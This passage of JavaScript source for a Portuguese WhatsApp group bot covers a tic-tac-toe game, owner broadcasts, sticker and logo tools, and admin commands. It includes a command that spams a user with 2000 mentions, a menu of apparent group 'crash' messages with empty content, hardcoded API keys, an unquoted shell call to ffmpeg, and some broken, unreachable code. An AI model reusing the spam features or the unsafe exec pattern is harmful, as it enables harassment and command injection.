if (i == 0) {board += `${i + 1}¬∫ ü•á : @${tictactoe[i].jid.split('@')[0]}\n‚ï≠‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ï∏\n‚îÇ ‚û£ Vit√≥rias: ${tictactoe[i].wins} üéä\n‚îÇ ‚û£ Derrotas: ${tictactoe[i].defeats} üí•\n‚îÇ ‚û£ Empates: ${tictactoe[i].ties} üåÄ\n‚îÇ ‚û£ Pontos: ${tictactoe[i].points} ‚ú®\n‚ï∞‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ï∏\n\n`
} else if (i == 1) {board += `${i + 1}¬∫ ü•à : @${tictactoe[i].jid.split('@')[0]}\n‚ï≠‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ï∏\n‚îÇ ‚û£ Vit√≥rias: ${tictactoe[i].wins} üéä\n‚îÇ ‚û£ Derrotas: ${tictactoe[i].defeats} üí•\n‚îÇ ‚û£ Empates: ${tictactoe[i].ties} üåÄ\n‚îÇ ‚û£ Pontos: ${tictactoe[i].points} ‚ú®\n‚ï∞‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ï∏\n\n`
} else if (i == 2) {board += `${i + 1}¬∫ ü•â : @${tictactoe[i].jid.split('@')[0]}\n‚ï≠‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ï∏\n‚îÇ ‚û£ Vit√≥rias: ${tictactoe[i].wins} üéä\n‚îÇ ‚û£ Derrotas: ${tictactoe[i].defeats} üí•\n‚îÇ ‚û£ Empates: ${tictactoe[i].ties} üåÄ\n‚îÇ ‚û£ Pontos: ${tictactoe[i].points} ‚ú®\n‚ï∞‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ïæ‚ï∏\n\n`
}
mentioned_jid.push(tictactoe[i].jid)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await tomioka.sendMessage(from, `Humm, √© necess√°rio que no m√≠nimo 3 pessoas tenham jogado...`, text, {quoted: msg})
}
break	
case 'coord' :
tttset.playertest = sender
if (!isGroup) {
enviar(ptbr.group())
} else if (tttset.tttstatus == "off") {
enviar(`Voc√™ ainda n√£o iniciou o jogo\nDigite ${prefix}ttt [DIFICULDADE] para iniciar`)
} else if (tttset.player != tttset.playertest) {
enviar(`Algu√©m j√° est√° jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.tttantibug == "on") {
enviar(`Aguarde a a√ß√£o anterior ser conclu√≠da...`)
} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' &&
coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
enviar(`Digite o comando com uma coordenada\nExemplo: ${prefix}coord a1`)
tttset.tttantibug = "off"
} else {
switch (args[0]) {
case 'a1':
if (esp.a1 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.a1 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a2':
if (esp.a2 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.a2 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a3':
if (esp.a3 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.a3 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b1':
if (esp.b1 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.b1 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b2':
if (esp.b2 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.b2 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b3':
if (esp.b3 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.b3 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c1':
if (esp.c1 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.c1 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c2':
if (esp.c2 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.c2 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c3':
if (esp.c3 != "üî≤") {
enviar('O espa√ßo j√° foi ocupado\nTente outra coordenada')
} else {
esp.c3 = "‚ùå"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
}
tttset.reActivate1 = "on"
enviar(`üåÄ1Ô∏è‚É£2Ô∏è‚É£3Ô∏è‚É£\nüÖ∞Ô∏è${esp.a1}${esp.a2}${esp.a3}\nüÖ±Ô∏è${esp.b1}${esp.b2}${esp.b3}\n¬©Ô∏è${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
if (WinnerX()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = Math.floor(Math.random() * 25) + 25
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 75) + 75
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = Math.floor(Math.random() * 200) + 200
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 1000) + 1000
addLevelingXp(tttset.player, randomTTTXP) 
break
}
tomioka.sendMessage(from, `üéâüéâ VIT√ìRIA DO JOGADOR üéâüéâ\n\n‚û£  RECOMPENSA: +${randomTTTXP} XP üîÆ`, text)
} else {
tomioka.sendMessage(from, `üéâüéâ VIT√ìRIA DO JOGADOR üéâüéâ`, text)
}
const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "üî≤"; esp.a2 = "üî≤"; esp.a3 = "üî≤"
esp.b1 = "üî≤"; esp.b2 = "üî≤"; esp.b3 = "üî≤"
esp.c1 = "üî≤"; esp.c2 = "üî≤"; esp.c3 = "üî≤"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 25) + 25)
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = 0
addLevelingXp(tttset.player, randomTTTXP)
break
}	
tomioka.sendMessage(from, `üéâüéâ VIT√ìRIA DO ùêÅùêéùêì üéâüéâ\n\n‚û£  PUNI√á√ÉO: ${randomTTTXP} XP üîÆ`, text)
} else {
tomioka.sendMessage(from, `üéâüéâ VIT√ìRIA DO ùêÅùêéùêì üéâüéâ`, text)
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "üî≤"; esp.a2 = "üî≤"; esp.a3 = "üî≤"
esp.b1 = "üî≤"; esp.b2 = "üî≤"; esp.b3 = "üî≤"
esp.c1 = "üî≤"; esp.c2 = "üî≤"; esp.c3 = "üî≤"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (Tie()) {
if (isCmd) {
tomioka.sendMessage(from, `üéâüéâ EMPATE üéâüéâ\n\n‚û£  N√ÉO H√Å GANHOS NEM PERDAS`, text)
} else {
tomioka.sendMessage(from, `üéâüéâ EMPATE üéâüéâ`, text)
}
const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "üî≤"; esp.a2 = "üî≤"; esp.a3 = "üî≤"
esp.b1 = "üî≤"; esp.b2 = "üî≤"; esp.b3 = "üî≤"
esp.c1 = "üî≤"; esp.c2 = "üî≤"; esp.c3 = "üî≤"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break
//_FIM DO JOGO DA VELHA By: Resen
/*case 'autostk':
if (!isGroup) return enviar(ptbr.group())
if (!isGroupAdmins) return enviar(ptbr.admin())
if (args.length < 1) return enviar(`Digite da forma correta:\nComando: ${prefix}autostk 1 para ativar `)
if (Number(args[0]) === 1) {
if (isAuto) return enviar('‚ùéO recurso AUTO STICKER j√° est√° ativado no grupo‚ùé')
atsticker.push(from)
fs.writeFileSync('./database/data/atisticker.json', JSON.stringify(_leveling))
enviar('‚úÖO recurso AUTO STICKER foi ativado‚úÖ')
} else if (Number(args[0]) === 0) {
if (!isAuto) return enviar('‚ùéO recurso AUTO STICKER n√£o est√° ativado no grupo‚ùé')
let position = false
Object.keys(atsticker).forEach((i) => {
if (atsticker[i] === from) {
position = i
}
})
if (position !== false) {
atsticker.splice(position, 1)
fs.writeFileSync('./database/data/atisticker.json', JSON.stringify(atsticker))
}
enviar('‚ùåO recurso AUTO STICKER foi desativado‚ùå')
} else {
enviar(`Digite da forma correta:\nComando: ${prefix}autostk 1, para ativar e 0 para desativar`)
}
break*/
case 'aviso':
if (!isOwner) return enviar ('Quem √© voc√™?')
if (args.length < 1) return enviar ('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
buff = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, buff, image, {caption: `[ ùêÄùêØùê¢ùê¨ùê® ùêìùêéùêå??ùêéùêäùêÄ ùêÅùêéùêì ]\n\n${body.slice(4)}`})
}
enviar('Transmissao enviada')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ ùêÄùêØùê¢ùê¨ùê® ùêìùêéùêåùêàùêéùêäùêÄ ùêÅùêéùêì ]\n\n${body.slice(7)}`)
}
enviar('Tm enviada com sucesso')
}
break
case 'tm':
if (!isOwner) return enviar ('Quem √© voc√™?')
if (args.length < 1) return enviar ('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg

for (let _ of anu) {
tomioka.sendMessage(_.jid, image, {caption: `[ ùêìùê´ùêöùêßùê¨ùê¶ùê¢ùê¨ùê¨ùêöÃÉùê® ùêìùêéùêåùêàùêéùêäùêÄ ]\n\n${body.slice(4)}`})
}
enviar('Transmissao enviada')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ ùêìùê´ùêöùê¨ùê¶ùê¢ùê¨ùêöÃÉùê® ùêìùêéùêåùêàùêéùêäùêÄ ]\n\n${body.slice(4)}`)
}
enviar('Tm enviada com sucesso')
}
break
case 'usuarios':
tomioka.sendMessage(from,`total de usu√°rios registrados no TOMIOKA BOT ü•∞: ${user.length}`, text)
break
case 'cgame':

return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
buff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${body.slice(7)}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'cparty':

part = `${body.slice(8)}`
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
bufferu = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'cstyle':

return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
buff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${body.slice(8)}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'cglass':

glass = `${body.slice(8)}`
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
bufferu = await getBuffer(`https://api.vhtear.com/wetglass?text=${glass}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'croman':               
roman = `${body.slice(8)}`
if (args.length < 1) return enviar ('Cad√™ o texto, mano??')
if (args.length > 10) return enviar ('pelo menos 10 caracteres')
buff = await getBuffer(`https://api.vhtear.com/romancetext?text=${roman}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {quoted: msg})

break 
case 'setnomebot':
if (args.length < 1) return
if (!isOwner) return enviar (mess.only.ownerB)
name = body.slice(12)
enviar(`O nome do bot foi alterado com sucesso para : ${name}`)
break
case 'clove':
if (args.length < 1) return enviar ('Cad√™ o texto, mano??')
if (args.length > 10) return enviar ('pelo menos 10 caracteres')
love = `${body.slice(7)}`
buff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${love}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {quoted: msg})

break
case 'smeme': case 'stickmeme':

top = arg.split('|')[0] 
bottom = arg.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg 
owgi = await  tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
enviar('Use fotos/adesivos!')
}
break
case 'travargp':
if (!isOwner) return enviar('s√≥ dono')
let tmporalc = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "MENU DE TRAVAS ",
"description": "Clique nos bot√µes baixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'TRAVAR1',
"rowId": ''
},
{
"title": 'TRAVAR2',
"rowId": ''
},
{
"title": 'TRAVAR3',
"rowId": ''
},
{
"title": 'TRAVAR4',
"rowId": ''
},
{
"title": 'TRAVAR5',
"rowId": ''
},
{
"title": 'TRAVAR6',
"rowId": ''
}
]
}
]                    
}
}, {quoted:tomioka})
tomioka.relayWAMessage(tmporalc)
break
case 'tomp3':
tomioka.updatePresence(from, Presence.composing) 
if (!isQuotedVideo) return enviar('Marque o video pfv')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return enviar('‚ùå Falha ao converter v√≠deo para mp3 ‚ùå')
buffer = fs.readFileSync(ran)
tomioka.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: msg})
fs.unlinkSync(ran)
})
break
case 'rptag':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar("Marque a pessoa [@]")
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
teks = `*Marca√ß√£o repetida*\n`
teks += "\n\n"
members_id = []
for (let z = 0; z < 2000; z++) {
teks += ` @${mentioned[0].split("@")[0]}`
members_id.push(mentioned[0])
}
mentions(teks, members_id, true)

break
case 'shorturl':
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/shorturl?url=${body.slice(10)}`)
hasil = `${anu.result}`
enviar(hasil)
break
case 'infonomor':
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(10)}`)
hasil = `*n√∫mero* \n${anu.nomor} *internacional* \n${anu.international}`
enviar(hasil)
break
case 'igstalk':
if (args.length < 1) return enviar ('Masukan username mu!!')
ige = body.slice(9)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://api.vhtear.com/igprofile?query=${ige}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
buffer = await getBuffer(anu.result.picture)
capt = `User Ditemukan!!\n\n*‚û∏ Nama :* ${anu.result.full_name}\n*‚û∏ Username :* ${anu.result.username}\n*‚û∏ Followers :* ${anu.result.follower}\n*‚û∏ Mengikuti :* ${anu.result.follow}\n*‚û∏ Jumlah Post :* ${anu.result.post_count}\n*‚û∏ TOMIOKA :* ${anu.result.is_private}\n*‚û∏ Bio :* ${anu.result.biography}`
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: capt})
break
case 'map':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
data = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`)
hasil = await getBuffer(data.gambar)
tomioka.sendMessage(from, hasil, image, {quoted: msg, caption: `Resultados de *${body.slice(5)}*`})

break
case 'users':
if (!isOwner) return enviar (mess.only.ownerB)    
teks = `\`\`\`‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *TOTAL DE USU√ÅRIOS TOMIOKA BOT üëë* „Äç\n\`\`\``
no = 0
for (let hehehe of user) {
no += 1
teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
}
teks += `‚îÇ+ Total de usu√°rios : ${user.length}\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *TOMIOKA* „Äç*‚îÄ‚îÄ‚îÄ‚îÄ`
tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": user}})
break
case 'limparchat':
case 'clearall':
case 'limpar':
case 'limpa':
if (!isOwner) return enviar ('s√≥ o cria pode')
anu = await tomioka.chats.all()
tomioka.setMaxListeners(25)
for (let _ of anu) {
tomioka.deleteChat(_.jid)
}
enviar(`[‚ùó] CHATS LIMPO`)

break
case 'tempban':
if (!isOwner) return enviar ('s√≥ o cria pode')
if (args[1]=="segundos") {var timer = args[0]+"000"
} else if (args[1]=="minuto") {var timer = args[0]+"0000"
} else if (args[1]=="hora") {var timer = args[0]+"00000"
} else {return enviar("*selecionar:*\nsegundos\nminuto\nhora")}
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.sayo> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupRemove(from, M_exe)
} else {
tomioka.groupRemove(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupRemove(from, [exe1])
}
enviar(`[‚ùó] tempo de ban : ${args[0]} ${args[1]}`)
setTimeout( () => {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupAdd(from, [exe1])			
}, timer)

break
case 'setppbot':
tomioka.updatePresence(from, Presence.composing) 
if (!isQuotedImage) return enviar (`Envie fotos com legendas ${prefix}setbotpp ou tags de imagem que j√° foram enviadas`)
if (!isOwner) return enviar (mess.only.ownerB)
enmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(enmedia)
await tomioka.updateProfilePicture(botNumber, media)
enviar('Obrigado pelo novo perfilüòó')
break
case 'happymod': 
///_Thiago02_
data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=rm4zfzxZwjqaiEL4mu6x`)
hupo = data.result[0] 
teks = `*Nome*: ${data.result[0].title}\n*versao*: ${hupo.version}\n*tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*valor*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
buffer = await getBuffer(hupo.image)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `${teks}`})

break
case 'setnome':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
tomioka.groupUpdateSubject(from, `${body.slice(9)}`)
tomioka.sendMessage(from, 'Sucesso, alterou o nome do grupo', text, {quoted: msg})
break
case 'infogc':
tomioka.updatePresence(from, Presence.composing)
if (!isGroup) return enviar ('s√≥ grupo')
try {
ppimg = await tomioka.getProfilePicture(from)
} catch {
ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
}
let buf = await getBuffer(ppimg)
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += `*Nome do grupo :* ${groupName}\n*Descri√ß√£o :* ${groupDesc}\n*N√∫mero de Administradores :* ${groupAdmins.length}\n*N√∫mero de membros :* ${groupMembers.length}`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `[${no.toString()}]`
}
tomioka.sendMessage(from, buf, image, {quoted: msg, caption: teks})
break
case 'block':

if (!isOwner) return enviar ("Apenas em grupo.")
tomioka.blockUser (`${body.slice(9)}@c.us`, "add")
tomioka.sendMessage(from, `BLOQUEADO`, text)
break
case 'unblock':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar (mess.only.ownerB)
tomioka.blockUser (`${body.slice(9)}@c.us`, "remove")
tomioka.sendMessage(from, `Pedido recebido, desbloquear ${body.slice(9)}@c.us`, text)
break
case 'bloqueados':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isPremium) return enviar ('s√≥ premium')
teks = 'Esta √© a lista de n√∫meros bloqueados :\n'
for (let block of blocked) {
teks += `~> @${block.split('@')[0]}\n`
}
teks += `Total : ${blocked.length}`
tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": blocked}})
break
case 'ler':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
.then(teks => {
enviar(teks.trim())
fs.unlinkSync(media)
})
.catch(err => {
enviar(err.message)
fs.unlinkSync(media)
})
} else {
enviar('S√≥ uma foto mano')
}
break


/*case 'wafig':

if (!isGroup)return tomioka.sendMessage(from, `[ ! ]  ·¥Ñ·¥è·¥ç·¥Ä…¥·¥Ö·¥è ·¥Ö…™s·¥ò·¥è…¥…™ ô ü·¥á s·¥è ü·¥è ·¥ò·¥Ä Ä·¥Ä  ü·¥ès …¢ Ä·¥ú·¥ò·¥ès....`, MessageType.text, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
enviar('erro')
})
.on('end', async function () {
console.log('Finish')
const webpWithMetadata = await WSF.createSticker('PAQUETE', 'AUTOR', `./sticker/${sender}.webp`)
tomioka.sendMessage(from, webpWithMetadata, MessageType.sticker, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
fs.unlinkSync(media)  
fs.unlinkSync(`./sticker/${sender}.webp`)  
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
tomioka.sendMessage(from, `[ ! ]  ·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä ·¥ás·¥ò·¥á Ä·¥Ä....`, MessageType.text, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
})
.on('end', async function () {
console.log('Finish')
const webpWithMetadata = await WSF.createSticker('PAQUETE', 'AUTOR', `./sticker/${sender}.webp`)
tomioka.sendMessage(from, webpWithMetadata, MessageType.sticker, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
enviar(`Env√≠e una foto/video + el comando ${prefix}sticker\n\nTambi√©n funciona si mencionas una foto o video junto al mismo comando\n\nNota: La duraci√≥n m√°xima del video es de 10 segundos`)
}
break*/
case 'amongus':
if (!isGroup) return enviar('s√≥ gp')
if (!isGroupAdmins) return enviar (ind.admin())
if (!isBotGroupAdmins) return enviar (ind.badmin())

if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar('Voc√™ precisa mencionar algu√©m')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus =
`.      „ÄÄ„ÄÇ„ÄÄ„ÄÄ„ÄÄ„ÄÄ‚Ä¢„ÄÄ    „ÄÄÔæü„ÄÄ„ÄÄ„ÄÇ
„ÄÄ„ÄÄ.„ÄÄ„ÄÄ„ÄÄ.„ÄÄ„ÄÄ„ÄÄ  „ÄÄ„ÄÄ.„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÇ„ÄÄ„ÄÄ   „ÄÇ„ÄÄ.
„ÄÄ.„ÄÄ„ÄÄ      „ÄÇ„ÄÄ        ‡∂û   „ÄÇ„ÄÄ    .    ‚Ä¢
‚Ä¢            @${mentioned[0].split('@')[0]} was E j e c t e d
1 impostor remain   „ÄÇ„ÄÄ.
„ÄÄ „ÄÄ„ÄÄ„ÄÇ„ÄÄ„ÄÄ „ÄÄ„ÄÄ„ÄÄ„ÄÄÔæü„ÄÄ„ÄÄ„ÄÄ.„ÄÄ      „ÄÄ„ÄÄ„ÄÄ.
,„ÄÄ„ÄÄ„ÄÄ„ÄÄ.                  .`
//tomioka.groupRemove(from, mentioned)
